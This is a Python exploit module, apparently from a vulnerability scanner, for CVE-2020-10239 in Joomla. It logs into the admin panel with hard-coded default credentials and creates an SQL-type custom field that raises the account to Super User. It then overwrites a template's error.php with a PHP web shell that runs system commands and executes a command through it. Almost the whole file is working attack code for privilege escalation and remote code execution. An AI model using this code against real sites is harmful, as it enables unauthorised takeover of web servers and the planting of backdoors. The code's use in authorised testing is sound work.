# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2020-10239

import sys
import requests
import re
import random
from colorama import Fore, Style, init
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

def extract_token(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print(f"{Fore.RED}{Style.BRIGHT}Cannot find CSRF token!{Style.RESET_ALL}\n")
        return None
    return match.group(1)

def try_admin_login(sess, profile_url, uname, upass):
    admin_profile_url = profile_url + '/administrator/index.php'
    print(f'{Fore.YELLOW}Getting token for Manager login{Style.RESET_ALL}')
    resp = sess.get(admin_profile_url, verify=False)
    token = extract_token(resp)
    if not token:
        return False
    print(f'{Fore.YELLOW}Logging in to Manager{Style.RESET_ALL}')
    data = {
        'username': uname,
        'passwd': upass,
        'task': 'login',
        token: '1'
    }
    resp = sess.post(admin_profile_url, data=data, verify=False)
    if 'task=profile.edit' not in resp.text:
        print(f'{Fore.RED}Manager Login Failure!{Style.RESET_ALL}')
        return None
    print(f'{Fore.GREEN}{Style.BRIGHT}Manager Login Successful! Username: {uname}, Password: {upass}{Style.RESET_ALL}')
    return True

def check_admin(sess, profile_url):
    profile_url_check = profile_url + '/administrator/index.php?option=com_content'
    resp = sess.get(profile_url_check, verify=False)
    token = extract_token(resp)
    if not token:
        print(f"{Fore.RED}{Style.BRIGHT}You are not Manager!{Style.RESET_ALL}")
        sys.exit()
    return token

def getManagerId(profile_url, sess):
    profile_url_get = profile_url + '/administrator/index.php?option=com_admin&view=profile&layout=edit'
    resp = sess.get(profile_url_get, verify=False)
    return re.findall(r'id=\d+', resp.text)

def createNewField(profile_url, sess, token):
    data = {
        'jform[title]': 'SQL query',
        'jform[type]': 'text',
        'jform[name]': 'SQL query',
        'jform[label]': 'SQL query',
        'jform[description]': 'SQL query',
        'jform[required]': 1,
        'jform[state]': 1,
        'jform[group_id]': 0,
        'jform[access]': 1,
        'jform[language]': '*',
        'jform[params][showlabel]': 1,
        'jform[params][display]': 2,
        'jform[params][display_readonly]': 2,
        'jform[id]': 0,
        'jform[context]': 'com_content.article',
        'task': 'field.apply',
        token: 1
    }
    resp = sess.post(profile_url + "/administrator/index.php?option=com_fields&context=com_content.article", data=data, verify=False)
    id = re.findall(r'id=\d+', resp.text)
    id_account = getManagerId(profile_url, sess)
    ran = '%d' % random.randrange(1, 10000)
    profile_url_post = profile_url + '/administrator/index.php?option=com_fields&context=com_content.article&layout=edit&' + id[0]
    newdata = {
        'jform[title]': 'SQL query ' + ran,
        'jform[type]': 'sql',
        'jform[name]': 'SQL query ' + ran,
        'jform[label]': 'SQL query ' + ran,
        'jform[description]': 'SQL query',
        'jform[required]': 1,
        'jform[fieldparams][query]': 'UPDATE #__user_usergroup_map SET group_id = 8 WHERE user_' + id_account[0] + ' AND group_id BETWEEN 6 AND 7;',
        'jform[state]': 1,
        'jform[group_id]': 0,
        'jform[access]': 1,
        'jform[language]': '*',
        'jform[params][showlabel]': 1,
        'jform[params][display]': 2,
        'jform[params][display_readonly]': 2,
        'jform[id]': id,
        'task': 'field.apply',
        'jform[context]': 'com_content.article',
        token: 1
    }
    newdata['task'] = 'field.apply'
    sess.post(profile_url_post, data=newdata, verify=False)
    profile_url_sql = profile_url + '/administrator/index.php?option=com_content&view=article&layout=edit'
    sess.get(profile_url_sql, verify=False)

def checkSuperAdmin(profile_url, sess):
    print(f"{Fore.YELLOW}Checking Super-admin{Style.RESET_ALL}")
    profile_url_config = profile_url + '/administrator/index.php?option=com_config'
    resp = sess.get(profile_url_config, verify=False)
    results = re.findall(r'name="([^"]+)"\s+[^>]*?value="([^"]+)"', resp.text, re.S)
    if not results:
        print(f"{Fore.RED}{Style.BRIGHT}You are not super-admin!{Style.RESET_ALL}")
        return False
    else:
        print(f"{Fore.GREEN}{Style.BRIGHT}You are now Super-admin!{Style.RESET_ALL}")
        return True

def rce(sess, profile_url, cmd, token):
    filename = 'error.php'
    shlink = profile_url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
    shdata_up = {
        'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
        'task': 'template.apply',
        token: '1',
        'jform[extension_id]': '506',
        'jform[filename]': '/' + filename
    }
    sess.post(shlink, data=shdata_up)
    path2shell = '/templates/protostar/error.php?cmd=' + cmd
    print(f'{Fore.GREEN}Checking shell:{Style.RESET_ALL}')
    shreq = sess.get(profile_url + path2shell)
    shresp = shreq.text
    print(shresp + f'{Fore.GREEN}Shell link: \n' + (profile_url + path2shell) + f'{Style.RESET_ALL}')
    print(f'{Fore.GREEN}{Style.BRIGHT}Module finished.{Style.RESET_ALL}')

def scan_cve_2020_10239(target):
    uname = 'admin' 
    upass = 'password123' 
    cmd = 'whoami'  
    sess = requests.Session()
    
    print(f'{Fore.CYAN}{Style.BRIGHT}Target: {target}{Style.RESET_ALL}')
    
    if not try_admin_login(sess, target, uname, upass):
        sys.exit()

    token = check_admin(sess, target)

    createNewField(target, sess, token)

    if checkSuperAdmin(target, sess):
        rce(sess, target, cmd, token)

